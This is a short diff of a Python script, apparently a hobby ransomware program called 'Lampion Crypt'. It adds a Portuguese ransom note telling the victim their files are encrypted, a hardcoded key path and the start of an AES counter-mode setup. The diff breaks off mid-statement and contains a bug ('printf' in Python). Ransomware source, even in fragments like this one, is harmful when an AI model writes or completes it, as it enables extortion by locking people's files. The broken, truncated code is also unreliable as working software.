@@ -32,4 +32,19 @@ def get_parser():
 def main():
     parser = get_parser()
     args = vars(parser.parse_args())
-    decrypt = 
+    decrypt = args['decrypt']
+
+    if decrypt:
+        printf('''
+        LAMPION CRYPT : UM RANSOM COM UMA PEXERA NA MÃO!
+        ------------------------------------------------
+        Seus arquivos foram encryptados.
+        Para decryptalos diga em que batalha morreu maria '{}'
+        '''.format(HARDCODED_KEY))
+        key = input('Digite a senha > ')
+    else:
+        if HARDCODED_KEY:
+            key = HARDCODED_KEY
+
+    ctr = Counter.new(128)
+    crypt = 
